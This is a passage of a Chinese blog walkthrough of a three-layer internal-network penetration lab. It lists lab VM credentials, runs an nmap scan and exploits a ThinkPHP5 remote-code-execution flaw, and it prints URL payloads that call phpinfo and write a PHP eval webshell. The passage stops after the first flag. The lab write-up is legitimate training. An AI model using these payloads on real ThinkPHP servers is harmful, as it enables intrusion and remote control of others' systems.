@@ -1,0 +1,827 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/7.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境搭建 网卡设置  主机设置   CentOS 12345678910root密码：teamssix.com此主机的IP地址：192.168.12.133192.168.22.128宝塔后台登陆地址及密码：地址：http:&#x2F;&#x2F;192.168.12.133:8888&#x2F;a768f109&#x2F;账号：eaj3yhsl密码：41bb8fee   Ubuntu 12345678910root密码：teamssi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CFS三层靶机内网渗透">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="环境搭建 网卡设置  主机设置   CentOS 12345678910root密码：teamssix.com此主机的IP地址：192.168.12.133192.168.22.128宝塔后台登陆地址及密码：地址：http:&#x2F;&#x2F;192.168.12.133:8888&#x2F;a768f109&#x2F;账号：eaj3yhsl密码：41bb8fee   Ubuntu 12345678910root密码：teamssi">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/19.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/21.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/22.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/23.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/24.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/25.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/26.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/27.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/28.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/29.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/30.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/35.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/36.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/37.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/38.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/39.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/40.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/41.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/42.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/43.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/44.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/45.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/46.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/47.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/48.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/49.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/50.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/51.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/52.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/53.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/54.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/55.jpg">
+<meta property="article:published_time" content="2024-02-24T07:49:38.474Z">
+<meta property="article:modified_time" content="2024-02-24T08:49:53.548Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.jpg">
+  
+  
+  
+  <title>CFS三层靶机内网渗透 - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CFS三层靶机内网渗透"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-24 15:49" pubdate>
+          February 24, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CFS三层靶机内网渗透</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>环境搭建</h1>
+<h2 id="网卡设置">网卡设置</h2>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="主机设置">主机设置</h2>
+<ol>
+<li>
+<p>CentOS</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root密码：teamssix.com<br><br>此主机的IP地址：<br><span class="hljs-number">192.168.12.133</span><br><span class="hljs-number">192.168.22.128</span><br><br>宝塔后台登陆地址及密码：<br>地址：http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">12</span>.<span class="hljs-number">133</span>:<span class="hljs-number">8888</span>/a768f109/<br>账号：eaj3yhsl<br>密码：41bb8fee<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Ubuntu</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root密码：teamssix.com<br><br>此主机的IP地址：<br><span class="hljs-number">192.168.22.129</span><br><span class="hljs-number">192.168.33.128</span><br><br>宝塔后台登陆地址及密码：<br>地址：http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">22</span>.<span class="hljs-number">129</span>:<span class="hljs-number">8888</span>/2cc52ec0/<br>账号：xdynr37d<br>密码：123qwe..<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Win7</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Administrator密码：teamssix.com<br><br>此主机的IP地址：<br><span class="hljs-number">192.168.33.33</span><br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>kali</p>
+<p>192.168.12.130</p>
+</li>
+<li>
+<p>宝塔配置</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h2 id="网络环境概述">网络环境概述</h2>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>现在假设只知道192.168.12.133主机，需要进行内网渗透</p>
+<h1>渗透过程</h1>
+<h2 id="打穿CentOS">打穿CentOS</h2>
+<h3 id="信息搜集">信息搜集</h3>
+<p>nmap扫描开放端口和服务</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.12.133</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>开放了80端口，先进行访问</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>用thinkphp5版本搭建的网站，这个版本的网站存在命令执行漏洞</p>
+<p>以下命令可以查看php信息</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.12.133/index.php</span><br>?s=index/\think\app/invokefunction<br><span class="hljs-variable">&amp;function</span>=call_user_func_array<br><span class="hljs-variable">&amp;vars</span>[<span class="hljs-number">0</span>]=phpinfo<br><span class="hljs-variable">&amp;vars</span>[<span class="hljs-number">1</span>][]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>使用searchexploit也可以，但是kali给出的攻击命令比较少，且结果不容易看</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="获取CentOS的webshell">获取CentOS的webshell</h3>
+<p>写入webshell</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://192.168.12.133/index.php</span><br><span class="language-xml">?s=index/think\app/invokefunction</span><br><span class="language-xml">&amp;function=call_user_func_array</span><br><span class="language-xml">&amp;vars[0]=file_put_contents　　　　　　　　　　//使用file_put_contents函数</span><br><span class="language-xml">&amp;vars[1][]=shell.php　　　　　　　　　　　　　//webshell文件名</span><br><span class="language-xml">&amp;vars[1][]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>蚁剑连接</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>发现了第一个flag！</p>
+<p>flag{e2D3aFdasde}</p>
+<img src="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.jpg" srcset="/img/loading.gif" lazyload class="">
